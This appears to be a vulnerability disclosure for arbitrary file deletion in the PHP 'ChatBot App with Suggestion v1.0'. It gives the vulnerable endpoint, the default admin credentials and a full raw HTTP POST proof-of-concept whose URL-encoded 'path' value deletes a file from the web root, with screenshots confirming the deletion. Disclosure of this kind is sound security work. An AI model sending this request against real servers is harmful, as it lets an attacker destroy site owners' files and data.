# ChatBot App with Suggestion v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: /simple_chat_bot/classes/Master.php?f=delete_img

Vulnerability location: /simple_chat_bot/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shell.php file in the root directory

```sql
POST /simple_chat_bot/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/simple_chat_bot/admin/?page=system_info
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

path=C%3A%2Fxampp%2Fhtdocs%2Fsimple_chat_bot%2Fshell.php
```

The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/170819752-b5c37e61-4797-40b2-9c63-74bcef6e5914.png)

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the root directory of the website

![image](https://user-images.githubusercontent.com/54017627/170819766-9f8fc3d5-38bf-41d9-81ba-e88f931bdf89.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/170819774-58054c9c-8f64-4d97-82e7-2b4e9f3fcc26.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/170819786-ad331484-ce94-4eff-8276-73ba0637c4b6.png)
